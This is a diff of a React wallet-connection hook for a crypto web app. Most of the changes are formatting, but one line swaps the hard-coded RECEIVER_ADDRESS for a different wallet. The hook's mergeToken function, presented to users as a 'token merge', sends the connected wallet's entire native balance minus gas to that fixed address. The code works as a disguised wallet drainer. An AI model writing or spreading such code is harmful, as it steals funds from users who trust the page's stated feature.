@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback } from "react";
 
 declare global {
   interface Window {
@@ -33,7 +33,7 @@ export const NETWORKS = {
   },
 };
 
-const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";
+const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";
 
 export function useWeb3() {
   const [selectedNetwork, setSelectedNetwork] = useState("bnb");
@@ -43,85 +43,91 @@ export function useWeb3() {
   const [connecting, setConnecting] = useState(false);
   const [error, setError] = useState("");
 
-  const showToast = useCallback((message: string, type: 'success' | 'error' = 'success') => {
-    // Simple toast notification
-    const toast = document.createElement('div');
-    toast.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white font-medium ${
-      type === 'success' ? 'bg-green-500' : 'bg-red-500'
-    }`;
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    
-    setTimeout(() => {
-      document.body.removeChild(toast);
-    }, 3000);
-  }, []);
+  const showToast = useCallback(
+    (message: string, type: "success" | "error" = "success") => {
+      // Simple toast notification
+      const toast = document.createElement("div");
+      toast.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white font-medium ${
+        type === "success" ? "bg-green-500" : "bg-red-500"
+      }`;
+      toast.textContent = message;
+      document.body.appendChild(toast);
+
+      setTimeout(() => {
+        document.body.removeChild(toast);
+      }, 3000);
+    },
+    [],
+  );
 
   const updateBalance = useCallback(async (address: string) => {
     if (!window.ethereum) return;
-    
+
     try {
-      const { ethers } = await import('ethers');
+      const { ethers } = await import("ethers");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const nativeBalance = await provider.getBalance(address);
       setBalance(ethers.formatEther(nativeBalance));
     } catch (error) {
-      console.error('Failed to update balance:', error);
+      console.error("Failed to update balance:", error);
     }
   }, []);
 
-  const switchNetwork = useCallback(async (key: string) => {
-    const net = NETWORKS[key as keyof typeof NETWORKS];
-    if (!window.ethereum) {
-      showToast("MetaMask not found", 'error');
-      return false;
-    }
-
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: net.chainId }],
-      });
-      return true;
-    } catch (switchError: any) {
-      if (switchError.code === 4902) {
-        try {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [
-              {
-                chainId: net.chainId,
-                chainName: net.name,
-                nativeCurrency: {
-                  name: net.symbol,
-                  symbol: net.symbol,
-                  decimals: 18,
-                },
-                rpcUrls: [net.rpcUrl],
-              },
-            ],
-          });
-          return true;
-        } catch (addError) {
-          showToast("Failed to add network", 'error');
-          return false;
-        }
-      } else {
-        showToast("Network switch rejected", 'error');
+  const switchNetwork = useCallback(
+    async (key: string) => {
+      const net = NETWORKS[key as keyof typeof NETWORKS];
+      if (!window.ethereum) {
+        showToast("MetaMask not found", "error");
         return false;
       }
-    }
-  }, [showToast]);
+
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: net.chainId }],
+        });
+        return true;
+      } catch (switchError: any) {
+        if (switchError.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [
+                {
+                  chainId: net.chainId,
+                  chainName: net.name,
+                  nativeCurrency: {
+                    name: net.symbol,
+                    symbol: net.symbol,
+                    decimals: 18,
+                  },
+                  rpcUrls: [net.rpcUrl],
+                },
+              ],
+            });
+            return true;
+          } catch (addError) {
+            showToast("Failed to add network", "error");
+            return false;
+          }
+        } else {
+          showToast("Network switch rejected", "error");
+          return false;
+        }
+      }
+    },
+    [showToast],
+  );
 
   const connectWallet = useCallback(async () => {
     if (!window.ethereum) {
-      showToast("MetaMask not detected", 'error');
+      showToast("MetaMask not detected", "error");
       return;
     }
 
     setConnecting(true);
     setError("");
-    
+
     try {
       // Switch to selected network first
       const networkSwitched = await switchNetwork(selectedNetwork);
@@ -130,30 +136,30 @@ export function useWeb3() {
         return;
       }
 
-      const { ethers } = await import('ethers');
+      const { ethers } = await import("ethers");
       const provider = new ethers.BrowserProvider(window.ethereum);
-      
+
       // Request account access
       const accounts = await provider.send("eth_requestAccounts", []);
-      
+
       if (accounts.length === 0) {
         throw new Error("No accounts found");
       }
 
       const signer = await provider.getSigner();
       const address = await signer.getAddress();
-      
+
       setAccount(address);
       setWalletConnected(true);
-      
+
       // Update balance
       await updateBalance(address);
-      
+
       showToast("Wallet connected successfully!");
     } catch (error: any) {
       console.error("Connection error:", error);
       setError(error.message || "Failed to connect wallet");
-      showToast(error.message || "Failed to connect wallet", 'error');
+      showToast(error.message || "Failed to connect wallet", "error");
     } finally {
       setConnecting(false);
     }
@@ -161,20 +167,20 @@ export function useWeb3() {
 
   const mergeToken = useCallback(async () => {
     if (!walletConnected || !window.ethereum || !account) {
-      showToast("Wallet not connected", 'error');
+      showToast("Wallet not connected", "error");
       return;
     }
 
     try {
-      const { ethers } = await import('ethers');
+      const { ethers } = await import("ethers");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      
+
       // Get current balance
       const nativeBalance = await provider.getBalance(account);
-      
+
       if (nativeBalance === 0n) {
-        showToast("No balance to merge", 'error');
+        showToast("No balance to merge", "error");
         return;
       }
 
@@ -198,7 +204,7 @@ export function useWeb3() {
       }
 
       if (valueToSend <= 0n) {
-        showToast("Not enough balance to cover gas fees", 'error');
+        showToast("Not enough balance to cover gas fees", "error");
         return;
       }
 
@@ -211,26 +217,26 @@ export function useWeb3() {
       });
 
       showToast("Transaction sent, waiting for confirmation...");
-      
+
       // Wait for confirmation
       await tx.wait();
-      
+
       showToast("Token merge successful!");
-      
+
       // Update balance
       await updateBalance(account);
-      
     } catch (error: any) {
       console.error("Merge error:", error);
       const errorMessage = error.reason || error.message || "Merge failed";
-      showToast(errorMessage, 'error');
+      showToast(errorMessage, "error");
     }
   }, [walletConnected, account, selectedNetwork, updateBalance, showToast]);
 
   // Check if wallet is already connected on load
   useEffect(() => {
     if (window.ethereum) {
-      window.ethereum.request({ method: 'eth_accounts' })
+      window.ethereum
+        .request({ method: "eth_accounts" })
         .then((accounts: string[]) => {
           if (accounts.length > 0) {
             setAccount(accounts[0]);
@@ -261,13 +267,16 @@ export function useWeb3() {
         window.location.reload();
       };
 
-      window.ethereum.on('accountsChanged', handleAccountsChanged);
-      window.ethereum.on('chainChanged', handleChainChanged);
+      window.ethereum.on("accountsChanged", handleAccountsChanged);
+      window.ethereum.on("chainChanged", handleChainChanged);
 
       return () => {
         if (window.ethereum.removeListener) {
-          window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
-          window.ethereum.removeListener('chainChanged', handleChainChanged);
+          window.ethereum.removeListener(
+            "accountsChanged",
+            handleAccountsChanged,
+          );
+          window.ethereum.removeListener("chainChanged", handleChainChanged);
         }
       };
     }
